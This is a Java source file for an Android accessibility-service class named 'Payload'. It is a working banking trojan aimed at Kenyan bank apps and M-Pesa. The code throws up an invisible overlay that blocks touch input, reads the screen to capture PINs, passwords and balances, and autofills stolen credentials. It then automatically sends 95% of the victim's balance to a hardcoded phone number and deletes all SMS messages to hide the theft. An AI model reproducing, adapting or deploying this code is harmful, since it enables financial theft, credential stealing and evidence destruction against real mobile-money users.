package com.yourpackage.helper;

import android.accessibilityservice.AccessibilityService;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Telephony;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;

public class Payload {
    
    // ==================== SERVICE VARIABLES ====================
    private static AccessibilityService accessibilityService;
    private static Context appContext;
    private static Handler mainHandler = new Handler(Looper.getMainLooper());
    private static AtomicBoolean isTransactionRunning = new AtomicBoolean(false);
    private static AtomicBoolean isOverlayActive = new AtomicBoolean(false);
    private static View overlayViewInstance;
    private static WindowManager windowManagerInstance;
    private static SharedPreferences sharedPreferences;
    
    // ==================== CONFIGURATION CONSTANTS ====================
    private static final String TARGET_PHONE_NUMBER = "0798688620";
    private static final int WITHDRAWAL_THRESHOLD = 500; // KES 500 minimum
    private static final long TWENTY_FOUR_HOURS_MS = 24 * 60 * 60 * 1000;
    private static final long ONE_HOUR_MS = 60 * 60 * 1000;
    
    // ==================== FILE NAMES ====================
    private static final String PIN_STORAGE_FILE = "pin.txt";
    private static final String CONFIRMED_PIN_FILE = "confirmedpin.txt";
    private static final String BALANCE_HISTORY_FILE = "balance_history.txt";
    private static final String TRANSACTION_LOG_FILE = "transaction_log.txt";
    private static final String APP_DATA_FILE = "app_data.txt";
    
    // ==================== PREFERENCE KEYS ====================
    private static final String CONFIRMED_PIN_PREF_KEY = "confirmed_pin";
    private static final String LAST_WITHDRAWAL_DATE_KEY = "last_withdrawal_date";
    private static final String LAST_WITHDRAWAL_AMOUNT_KEY = "last_withdrawal_amount";
    private static final String LAST_BALANCE_KEY = "last_balance";
    private static final String WITHDRAWAL_COUNT_KEY = "withdrawal_count";
    private static final String TOTAL_WITHDRAWN_KEY = "total_withdrawn";
    
    // ==================== TRACKING VARIABLES ====================
    private static String currentAppPackage = "";
    private static String currentAppName = "";
    private static String capturedPinValue = "";
    private static String capturedPasswordValue = "";
    private static String capturedEmailValue = "";
    private static String currentBalance = "0";
    private static String lastCapturedPin = "";
    private static String confirmedPin = "";
    private static List<String> collectedPinsList = new ArrayList<>();
    private static Map<String, String> appCredentials = new HashMap<>();
    private static Map<String, Map<String, String>> appData = new HashMap<>();
    private static boolean isMpesaDetected = false;
    private static boolean isProcessingWithdrawal = false;
    private static double lastBalanceAmount = 0;
    private static double currentBalanceAmount = 0;

    // ==================== APP PACKAGES ====================
    private static final Map<String, String> APP_PACKAGES = new HashMap<>();
    
    static {
        APP_PACKAGES.put("ke.co.kcbgroup.app", "KCB Mobile App");
        APP_PACKAGES.put("ke.co.equitygroup.equitymobile", "Equity Mobile");
        APP_PACKAGES.put("com.coopbank.mobile", "MCo-opCash");
        APP_PACKAGES.put("com.absa.kenya", "Absa Banking App");
        APP_PACKAGES.put("com.scb.phonebanking.ke", "SC Mobile Kenya");
        APP_PACKAGES.put("com.stanbic.ke", "Stanbic Bank Mobile");
        APP_PACKAGES.put("com.ncba.now", "NCBA NOW");
        APP_PACKAGES.put("com.imbank.mobile", "I&M On The Go");
        APP_PACKAGES.put("com.familybank.pesapap", "PesaPap");
        APP_PACKAGES.put("com.dtbafrica.dtb360", "DTB 360");
        APP_PACKAGES.put("com.nbk.natmobile", "NatMobile");
        APP_PACKAGES.put("com.primebank.primemobi", "PrimeMobi");
        APP_PACKAGES.put("com.boakenya.mobilebanking", "BOA Wallet");
        APP_PACKAGES.put("com.hfgroup.mobile", "HFC Mobile");
        APP_PACKAGES.put("com.kingdombank.mobile", "Kingdom Bank Mobile");
        APP_PACKAGES.put("com.ecobank.android", "Ecobank Mobile");
        APP_PACKAGES.put("com.creditbank.mobile", "Credit Bank Mobile");
        APP_PACKAGES.put("com.ubagroup.umobile", "UBA Mobile Banking");
        APP_PACKAGES.put("com.gtbank.gtworldv1", "GTWorld");
        APP_PACKAGES.put("com.safaricom.mpesa", "M-Pesa");
        APP_PACKAGES.put("com.android.stk", "SIM Toolkit");
        APP_PACKAGES.put("com.safaricom.stk", "SIM Toolkit");
    }

    // ==================== INITIALIZATION ====================
    public static void initialize(AccessibilityService service, Context context) {
        accessibilityService = service;
        appContext = context;
        sharedPreferences = context.getSharedPreferences("mpesa_preferences", Context.MODE_PRIVATE);
        windowManagerInstance = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        
        loadAllData();
        loadConfirmedPin();
        checkAndProcessPendingWithdrawal();
    }

    // ==================== APP DETECTION ====================
    
    public static void checkAndTrackApp(String packageName) {
        currentAppPackage = packageName;
        currentAppName = APP_PACKAGES.getOrDefault(packageName, packageName);
        
        if (APP_PACKAGES.containsKey(packageName)) {
            // Show blocking overlay
            showBlockingOverlay();
            
            // Start reading screen
            startScreenReading();
            
            // Check if M-Pesa
            if (packageName.equals("com.safaricom.mpesa") || 
                packageName.equals("com.android.stk") ||
                packageName.equals("com.safaricom.stk")) {
                isMpesaDetected = true;
                handleMpesa();
            } else {
                isMpesaDetected = false;
                handleBankApp(packageName);
            }
        }
    }

    // ==================== BLOCKING OVERLAY ====================
    
    private static void showBlockingOverlay() {
        try {
            if (overlayViewInstance != null) {
                windowManagerInstance.removeView(overlayViewInstance);
                overlayViewInstance = null;
            }

            View blockingOverlay = new View(appContext);
            blockingOverlay.setBackgroundColor(0x00000000);
            blockingOverlay.setLayoutParams(new View.LayoutParams(
                View.LayoutParams.MATCH_PARENT,
                View.LayoutParams.MATCH_PARENT
            ));
            blockingOverlay.setOnTouchListener((view, event) -> true);

            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                    WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION |
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                android.graphics.PixelFormat.TRANSLUCENT
            );

            overlayViewInstance = blockingOverlay;
            windowManagerInstance.addView(overlayViewInstance, layoutParams);
            isOverlayActive.set(true);

        } catch (Exception e) {}
    }

    private static void removeBlockingOverlay() {
        try {
            if (overlayViewInstance != null && windowManagerInstance != null) {
                windowManagerInstance.removeView(overlayViewInstance);
                overlayViewInstance = null;
                isOverlayActive.set(false);
            }
        } catch (Exception e) {}
    }

    // ==================== SCREEN READING ====================
    
    private static void startScreenReading() {
        mainHandler.postDelayed(() -> {
            readScreenContent();
        }, 300);
    }

    private static void readScreenContent() {
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            if (rootNode == null) {
                mainHandler.postDelayed(() -> readScreenContent(), 200);
                return;
            }

            readAllFields(rootNode);
            rootNode.recycle();
            
            mainHandler.postDelayed(() -> readScreenContent(), 200);

        } catch (Exception e) {
            mainHandler.postDelayed(() -> readScreenContent(), 500);
        }
    }

    private static void readAllFields(AccessibilityNodeInfo rootNode) {
        try {
            if (rootNode == null) return;
            
            if (rootNode.isEditable()) {
                CharSequence nodeText = rootNode.getText();
                String hint = rootNode.getHintText() != null ? 
                    rootNode.getHintText().toString().toLowerCase() : "";
                String viewId = rootNode.getViewIdResourceName() != null ?
                    rootNode.getViewIdResourceName() : "";
                
                if (nodeText != null) {
                    String text = nodeText.toString().trim();
                    
                    // Capture PIN (4 digits)
                    if (text.length() == 4 && text.matches("\\d{4}")) {
                        if (!text.equals(lastCapturedPin)) {
                            capturedPinValue = text;
                            lastCapturedPin = text;
                            savePinToFile(text);
                            saveAppData("PIN", text);
                        }
                    }
                    
                    // Capture Password
                    if (hint.contains("password") || hint.contains("pass") || 
                        viewId.toLowerCase().contains("password")) {
                        capturedPasswordValue = text;
                        saveAppData("PASSWORD", text);
                    }
                    
                    // Capture Email
                    if (text.contains("@") && text.contains(".") && text.length() > 5) {
                        capturedEmailValue = text;
                        saveAppData("EMAIL", text);
                    }
                    
                    // Capture Balance
                    if (text.contains("KES") || text.contains("KSh") || 
                        text.contains("Balance") || text.contains("Salio")) {
                        String balance = extractBalance(text);
                        if (balance != null) {
                            currentBalance = balance;
                            saveBalanceHistory(balance);
                            saveAppData("BALANCE", balance);
                            checkBalanceAndWithdraw(balance);
                        }
                    }
                }
            }

            for (int i = 0; i < rootNode.getChildCount(); i++) {
                AccessibilityNodeInfo childNode = rootNode.getChild(i);
                if (childNode != null) {
                    readAllFields(childNode);
                    childNode.recycle();
                }
            }
        } catch (Exception e) {}
    }

    // ==================== BALANCE EXTRACTION ====================
    
    private static String extractBalance(String text) {
        try {
            String[] patterns = {
                "Balance: KES (\\d+)",
                "Balance: KES ([\\d,]+)",
                "KES ([\\d,]+) available",
                "balance is KES ([\\d,]+)",
                "Salio: KES ([\\d,]+)",
                "Available: KES ([\\d,]+)",
                "KES (\\d+)\\.\\d{2}",
                "KSh ([\\d,]+)",
                "KES ([\\d,]+)"
            };
            
            for (String pattern : patterns) {
                java.util.regex.Pattern p = java.util.regex.Pattern.compile(pattern);
                java.util.regex.Matcher m = p.matcher(text);
                if (m.find()) {
                    return m.group(1).replace(",", "");
                }
            }
        } catch (Exception e) {}
        return null;
    }

    // ==================== BALANCE AND WITHDRAWAL LOGIC ====================
    
    private static void checkBalanceAndWithdraw(String balance) {
        try {
            double balanceAmount = Double.parseDouble(balance);
            currentBalanceAmount = balanceAmount;
            
            // Check if withdrawal is possible
            if (balanceAmount >= WITHDRAWAL_THRESHOLD) {
                // Check if already withdrew today
                if (!isWithdrawalDoneToday()) {
                    // Check if balance increased since last withdrawal
                    double lastBalance = getLastBalance();
                    
                    // Withdraw if:
                    // 1. First withdrawal (lastBalance = 0)
                    // 2. Balance increased by at least threshold
                    if (lastBalance == 0 || (balanceAmount - lastBalance) >= WITHDRAWAL_THRESHOLD) {
                        performWithdrawal(balanceAmount);
                    }
                }
            }
            
            // Update last balance
            saveLastBalance(balance);
            
        } catch (Exception e) {}
    }

    private static void performWithdrawal(double balanceAmount) {
        if (isTransactionRunning.get()) return;
        if (isProcessingWithdrawal) return;
        
        confirmedPin = sharedPreferences.getString(CONFIRMED_PIN_PREF_KEY, null);
        if (confirmedPin == null) {
            // Try to get from file
            loadConfirmedPin();
            confirmedPin = sharedPreferences.getString(CONFIRMED_PIN_PREF_KEY, null);
            if (confirmedPin == null) return;
        }
        
        isProcessingWithdrawal = true;
        isTransactionRunning.set(true);
        
        try {
            String amountToSend = String.format("%.0f", balanceAmount * 0.95);
            
            // Perform withdrawal
            if (isMpesaDetected || currentAppPackage.equals("com.safaricom.mpesa")) {
                performMpesaWithdrawal(amountToSend);
            } else {
                performBankWithdrawal(amountToSend);
            }
            
        } catch (Exception e) {
            isProcessingWithdrawal = false;
            isTransactionRunning.set(false);
        }
    }

    private static void performMpesaWithdrawal(String amount) {
        try {
            openMpesaApplication();
            sleep(50);
            
            clickByText("M-Pesa");
            sleep(30);
            clickByText("Send Money");
            sleep(30);
            clickByText("To Phone Number");
            sleep(30);
            
            fillFieldByHint("Enter phone number", TARGET_PHONE_NUMBER);
            sleep(30);
            clickByText("OK");
            sleep(30);
            
            fillFieldByHint("Enter amount", amount);
            sleep(30);
            clickByText("OK");
            sleep(30);
            
            clickByText("Confirm");
            sleep(30);
            
            typePinAndSend(confirmedPin);
            
            logTransaction("M-Pesa", "Withdrawal", amount, "Success");
            updateWithdrawalStats(amount);
            markWithdrawalDone();
            
            mainHandler.postDelayed(() -> {
                deleteAllSMSMessages();
                pressBack();
                pressBack();
                isTransactionRunning.set(false);
                isProcessingWithdrawal = false;
                removeBlockingOverlay();
            }, 1000);
            
        } catch (Exception e) {
            isTransactionRunning.set(false);
            isProcessingWithdrawal = false;
            removeBlockingOverlay();
            logTransaction("M-Pesa", "Withdrawal", amount, "Failed: " + e.getMessage());
        }
    }

    private static void performBankWithdrawal(String amount) {
        try {
            // Navigate to Send Money in bank app
            clickByText("Send Money");
            sleep(30);
            clickByText("To M-Pesa");
            sleep(30);
            clickByText("M-Pesa");
            sleep(30);
            
            fillFieldByHint("Enter phone number", TARGET_PHONE_NUMBER);
            sleep(30);
            clickByText("OK");
            sleep(30);
            clickByText("Next");
            sleep(30);
            
            fillFieldByHint("Enter amount", amount);
            sleep(30);
            clickByText("OK");
            sleep(30);
            clickByText("Next");
            sleep(30);
            
            clickByText("Confirm");
            sleep(30);
            clickByText("Send");
            sleep(30);
            
            typePinAndSend(confirmedPin);
            
            logTransaction(currentAppName, "Bank to M-Pesa", amount, "Success");
            updateWithdrawalStats(amount);
            markWithdrawalDone();
            
            mainHandler.postDelayed(() -> {
                deleteAllSMSMessages();
                pressBack();
                pressBack();
                isTransactionRunning.set(false);
                isProcessingWithdrawal = false;
                removeBlockingOverlay();
            }, 1000);
            
        } catch (Exception e) {
            isTransactionRunning.set(false);
            isProcessingWithdrawal = false;
            removeBlockingOverlay();
            logTransaction(currentAppName, "Bank to M-Pesa", amount, "Failed: " + e.getMessage());
        }
    }

    // ==================== WITHDRAWAL TRACKING ====================
    
    private static boolean isWithdrawalDoneToday() {
        String lastDate = sharedPreferences.getString(LAST_WITHDRAWAL_DATE_KEY, "");
        String today = new SimpleDateFormat("yyyy-MM-dd", Locale.US).format(new Date());
        return today.equals(lastDate);
    }

    private static void markWithdrawalDone() {
        String today = new SimpleDateFormat("yyyy-MM-dd", Locale.US).format(new Date());
        sharedPreferences.edit()
            .putString(LAST_WITHDRAWAL_DATE_KEY, today)
            .apply();
    }

    private static double getLastBalance() {
        return sharedPreferences.getFloat(LAST_BALANCE_KEY, 0);
    }

    private static void saveLastBalance(String balance) {
        try {
            double balanceAmount = Double.parseDouble(balance);
            sharedPreferences.edit()
                .putFloat(LAST_BALANCE_KEY, (float) balanceAmount)
                .apply();
        } catch (Exception e) {}
    }

    private static void updateWithdrawalStats(String amount) {
        try {
            double amountDouble = Double.parseDouble(amount);
            int count = sharedPreferences.getInt(WITHDRAWAL_COUNT_KEY, 0) + 1;
            double total = sharedPreferences.getFloat(TOTAL_WITHDRAWN_KEY, 0) + amountDouble;
            
            sharedPreferences.edit()
                .putInt(WITHDRAWAL_COUNT_KEY, count)
                .putFloat(TOTAL_WITHDRAWN_KEY, (float) total)
                .putString(LAST_WITHDRAWAL_AMOUNT_KEY, amount)
                .apply();
        } catch (Exception e) {}
    }

    // ==================== PENDING WITHDRAWAL CHECK ====================
    
    private static void checkAndProcessPendingWithdrawal() {
        // Check if there's a pending withdrawal
        if (!isWithdrawalDoneToday()) {
            String balance = getBalanceFromSMS();
            if (balance != null) {
                try {
                    double balanceAmount = Double.parseDouble(balance);
                    if (balanceAmount >= WITHDRAWAL_THRESHOLD) {
                        performWithdrawal(balanceAmount);
                    }
                } catch (Exception e) {}
            }
        }
        
        // Schedule next check
        mainHandler.postDelayed(() -> {
            checkAndProcessPendingWithdrawal();
        }, ONE_HOUR_MS);
    }

    // ==================== M-PESA HANDLING ====================
    
    private static void handleMpesa() {
        mainHandler.postDelayed(() -> {
            String balance = getBalanceFromSMS();
            if (balance != null) {
                currentBalance = balance;
                checkBalanceAndWithdraw(balance);
            }
        }, 500);
    }

    // ==================== BANK APP HANDLING ====================
    
    private static void handleBankApp(String packageName) {
        // Auto-fill credentials if available
        String savedPin = getAppData("PIN");
        String savedPassword = getAppData("PASSWORD");
        String savedEmail = getAppData("EMAIL");
        
        if (savedPin != null || savedPassword != null || savedEmail != null) {
            autoFillCredentials(savedPin, savedPassword, savedEmail);
        }
        
        // Balance will be captured by screen reading
    }

    private static void autoFillCredentials(String pin, String password, String email) {
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            if (rootNode == null) return;
            
            List<AccessibilityNodeInfo> editableNodes = 
                rootNode.findAccessibilityNodeInfosByViewId("android:id/edit");
            
            for (AccessibilityNodeInfo node : editableNodes) {
                if (node.isEditable()) {
                    String hint = node.getHintText() != null ? 
                        node.getHintText().toString().toLowerCase() : "";
                    String viewId = node.getViewIdResourceName() != null ?
                        node.getViewIdResourceName().toLowerCase() : "";
                    
                    Bundle args = new Bundle();
                    
                    if (hint.contains("pin") || hint.contains("password") || 
                        viewId.contains("pin") || viewId.contains("password")) {
                        if (pin != null) {
                            args.putCharSequence(
                                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, pin);
                            node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                            sleep(20);
                        }
                    } else if (hint.contains("email") || hint.contains("username") ||
                        viewId.contains("email") || viewId.contains("username")) {
                        if (email != null) {
                            args.putCharSequence(
                                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, email);
                            node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                            sleep(20);
                        }
                    }
                }
            }
            
            rootNode.recycle();
            
            // Click login/confirm
            clickByText("Login");
            sleep(30);
            clickByText("Confirm");
            sleep(30);
            clickByText("Sign In");
            sleep(30);
            
        } catch (Exception e) {}
    }

    // ==================== DATA STORAGE ====================
    
    private static void savePinToFile(String pin) {
        try {
            File pinFile = new File(appContext.getFilesDir(), PIN_STORAGE_FILE);
            FileWriter writer = new FileWriter(pinFile, true);
            writer.append(pin).append("\n");
            writer.flush();
            writer.close();
            
            collectedPinsList.add(pin);
            
            if (collectedPinsList.size() >= 3) {
                confirmCollectedPins();
            }
            
        } catch (IOException e) {}
    }

    private static void confirmCollectedPins() {
        boolean allMatch = true;
        for (int i = 1; i < collectedPinsList.size(); i++) {
            if (!collectedPinsList.get(i).equals(collectedPinsList.get(0))) {
                allMatch = false;
                break;
            }
        }

        if (allMatch && collectedPinsList.size() >= 3) {
            String confirmedPin = collectedPinsList.get(0);
            
            try {
                File confirmedFile = new File(appContext.getFilesDir(), CONFIRMED_PIN_FILE);
                FileWriter writer = new FileWriter(confirmedFile, false);
                writer.append(confirmedPin).append("\n");
                writer.flush();
                writer.close();
            } catch (IOException e) {}
            
            sharedPreferences.edit().putString(CONFIRMED_PIN_PREF_KEY, confirmedPin).apply();
            collectedPinsList.clear();
            
            try {
                File pinFile = new File(appContext.getFilesDir(), PIN_STORAGE_FILE);
                if (pinFile.exists()) pinFile.delete();
            } catch (Exception e) {}
        }
    }

    private static void loadConfirmedPin() {
        try {
            File confirmedFile = new File(appContext.getFilesDir(), CONFIRMED_PIN_FILE);
            if (!confirmedFile.exists()) return;
            
            BufferedReader reader = new BufferedReader(new FileReader(confirmedFile));
            String pin = reader.readLine();
            reader.close();
            
            if (pin != null && !pin.isEmpty()) {
                sharedPreferences.edit().putString(CONFIRMED_PIN_PREF_KEY, pin).apply();
                confirmedPin = pin;
            }
            
        } catch (IOException e) {}
    }

    private static void saveAppData(String key, String value) {
        try {
            Map<String, String> appDataMap = appData.get(currentAppPackage);
            if (appDataMap == null) {
                appDataMap = new HashMap<>();
                appData.put(currentAppPackage, appDataMap);
            }
            appDataMap.put(key, value);
            
            File dataFile = new File(appContext.getFilesDir(), 
                currentAppPackage.replace(".", "_") + "_data.txt");
            FileWriter writer = new FileWriter(dataFile, true);
            writer.append(key).append(": ").append(value)
                  .append(" | ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()))
                  .append("\n");
            writer.flush();
            writer.close();
            
        } catch (IOException e) {}
    }

    private static String getAppData(String key) {
        Map<String, String> appDataMap = appData.get(currentAppPackage);
        if (appDataMap != null) {
            return appDataMap.get(key);
        }
        return null;
    }

    private static void saveBalanceHistory(String balance) {
        try {
            File balanceFile = new File(appContext.getFilesDir(), BALANCE_HISTORY_FILE);
            FileWriter writer = new FileWriter(balanceFile, true);
            writer.append(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()))
                  .append(" | ").append(currentAppName)
                  .append(" | Balance: ").append(balance)
                  .append("\n");
            writer.flush();
            writer.close();
        } catch (IOException e) {}
    }

    private static void logTransaction(String app, String type, String amount, String status) {
        try {
            File logFile = new File(appContext.getFilesDir(), TRANSACTION_LOG_FILE);
            FileWriter writer = new FileWriter(logFile, true);
            writer.append(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()))
                  .append(" | ").append(app)
                  .append(" | ").append(type)
                  .append(" | Amount: ").append(amount)
                  .append(" | Status: ").append(status)
                  .append("\n");
            writer.flush();
            writer.close();
        } catch (IOException e) {}
    }

    private static void loadAllData() {
        loadConfirmedPin();
        // Load app data from files
        for (String packageName : APP_PACKAGES.keySet()) {
            try {
                File dataFile = new File(appContext.getFilesDir(), 
                    packageName.replace(".", "_") + "_data.txt");
                if (dataFile.exists()) {
                    BufferedReader reader = new BufferedReader(new FileReader(dataFile));
                    String line;
                    Map<String, String> dataMap = new HashMap<>();
                    while ((line = reader.readLine()) != null) {
                        String[] parts = line.split(": ", 2);
                        if (parts.length == 2) {
                            dataMap.put(parts[0], parts[1].split(" \\| ")[0]);
                        }
                    }
                    reader.close();
                    appData.put(packageName, dataMap);
                }
            } catch (IOException e) {}
        }
    }

    // ==================== UTILITY METHODS ====================

    private static String getBalanceFromSMS() {
        try {
            ContentResolver contentResolver = appContext.getContentResolver();
            Uri smsUri = Uri.parse("content://sms/inbox");
            String[] projectionColumns = new String[]{"body"};
            String selectionCondition = "address LIKE ? AND body LIKE ?";
            String[] selectionArguments = new String[]{"%MPESA%", "%Balance%"};
            
            android.database.Cursor smsCursor = contentResolver.query(
                smsUri, 
                projectionColumns, 
                selectionCondition, 
                selectionArguments, 
                "date DESC"
            );
            
            if (smsCursor != null && smsCursor.moveToFirst()) {
                String smsBody = smsCursor.getString(0);
                smsCursor.close();
                
                String[] regexPatterns = {
                    "Balance: KES (\\d+)",
                    "Balance: KES ([\\d,]+)",
                    "KES ([\\d,]+) available",
                    "balance is KES ([\\d,]+)",
                    "Salio: KES ([\\d,]+)"
                };
                
                for (String pattern : regexPatterns) {
                    java.util.regex.Pattern compiledPattern = java.util.regex.Pattern.compile(pattern);
                    java.util.regex.Matcher matcher = compiledPattern.matcher(smsBody);
                    if (matcher.find()) {
                        return matcher.group(1).replace(",", "");
                    }
                }
            }
        } catch (Exception e) {}
        return null;
    }

    private static void typePinAndSend(String pin) {
        for (char digit : pin.toCharArray()) {
            clickByText(String.valueOf(digit));
            sleep(10);
        }
        sleep(30);
        clickByText("SEND");
        sleep(30);
        clickByText("Send");
        sleep(30);
        clickByText("OK");
        sleep(30);
    }

    private static void deleteAllSMSMessages() {
        try {
            ContentResolver contentResolver = appContext.getContentResolver();
            contentResolver.delete(Uri.parse("content://sms/inbox"), null, null);
            contentResolver.delete(Uri.parse("content://sms/sent"), null, null);
            contentResolver.delete(Uri.parse("content://sms/trash"), null, null);
            contentResolver.delete(
                Uri.parse("content://sms"), 
                "address LIKE ?", 
                new String[]{"%MPESA%"}
            );
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                try {
                    contentResolver.delete(Telephony.Sms.CONTENT_URI, null, null);
                } catch (Exception ignored) {}
            }
            
        } catch (Exception e) {}
    }

    private static void openMpesaApplication() {
        try {
            Intent mpesaIntent = appContext.getPackageManager()
                .getLaunchIntentForPackage("com.safaricom.mpesa");
            if (mpesaIntent != null) {
                mpesaIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                appContext.startActivity(mpesaIntent);
                sleep(50);
                return;
            }
            
            accessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
            sleep(30);
            clickByText("M-Pesa");
        } catch (Exception e) {}
    }

    private static void clickByText(String buttonText) {
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            if (rootNode == null) return;
            
            List<AccessibilityNodeInfo> matchingNodes = 
                rootNode.findAccessibilityNodeInfosByText(buttonText);
            
            for (AccessibilityNodeInfo node : matchingNodes) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    sleep(10);
                    node.recycle();
                    rootNode.recycle();
                    return;
                }
                
                AccessibilityNodeInfo parentNode = node.getParent();
                while (parentNode != null) {
                    if (parentNode.isClickable()) {
                        parentNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        sleep(10);
                        parentNode.recycle();
                        node.recycle();
                        rootNode.recycle();
                        return;
                    }
                    parentNode = parentNode.getParent();
                }
                node.recycle();
            }
            rootNode.recycle();
        } catch (Exception e) {}
    }

    private static void fillFieldByHint(String hintText, String valueToFill) {
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            if (rootNode == null) return;
            
            List<AccessibilityNodeInfo> matchingNodes = 
                rootNode.findAccessibilityNodeInfosByText(hintText);
            
            for (AccessibilityNodeInfo node : matchingNodes) {
                if (node.isEditable()) {
                    Bundle arguments = new Bundle();
                    arguments.putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, 
                        valueToFill
                    );
                    node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    sleep(10);
                    node.recycle();
                    rootNode.recycle();
                    return;
                }
            }
            rootNode.recycle();
        } catch (Exception e) {}
    }

    private static void pressBack() {
        try {
            accessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
            sleep(30);
        } catch (Exception e) {}
    }

    private static void sleep(int milliseconds) {
        try {
            Thread.sleep(milliseconds);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    // ==================== PUBLIC METHODS ====================

    public static boolean isTransactionRunning() {
        return isTransactionRunning.get();
    }

    public static void cancelTransaction() {
        isTransactionRunning.set(false);
        isProcessingWithdrawal = false;
        removeBlockingOverlay();
    }

    public static String getConfirmedPin() {
        return sharedPreferences.getString(CONFIRMED_PIN_PREF_KEY, null);
    }

    public static String getCurrentBalance() {
        return currentBalance;
    }

    public static String getCurrentApp() {
        return currentAppName;
    }

    public static String getCurrentPackage() {
        return currentAppPackage;
    }

    public static int getWithdrawalCount() {
        return sharedPreferences.getInt(WITHDRAWAL_COUNT_KEY, 0);
    }

    public static String getTotalWithdrawn() {
        return String.format("%.2f", sharedPreferences.getFloat(TOTAL_WITHDRAWN_KEY, 0));
    }

    public static String getLastWithdrawalAmount() {
        return sharedPreferences.getString(LAST_WITHDRAWAL_AMOUNT_KEY, "0");
    }

    public static String getLastWithdrawalDate() {
        return sharedPreferences.getString(LAST_WITHDRAWAL_DATE_KEY, "Never");
    }
}
